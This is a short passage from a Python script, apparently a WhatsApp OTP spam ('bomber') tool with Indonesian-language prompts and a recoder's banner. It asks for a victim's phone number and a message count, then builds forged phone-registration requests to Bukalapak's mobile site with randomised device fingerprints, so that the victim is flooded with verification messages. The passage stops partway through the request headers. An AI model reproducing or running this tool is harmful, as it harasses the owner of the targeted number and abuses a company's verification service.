...
print("\tRECODED BY MR.HC")
print("limit 20 per nomor Tod")
print("input nomor wa pakai '628XXXXXX'")
no=input("nomor: ")
jm=int(input("jumlah: "))
if jm > 20:
	exit("limit 20 per nomor cok yaelah")
elif jm <= 0:
	exit("???!!!!¿")
def main(arg):
	ranmd5=hashlib.md5(str(random.getrandbits(128)).encode('utf-8')).hexdigest()
	dat={'feature':'phone_registration',
		'feature_tag':'',
		'manual_phone':no,
		'device_fingerprint':ranmd5,
		'channel':'WhatsApp'
		}
	head={'Host':'m.bukalapak.com',
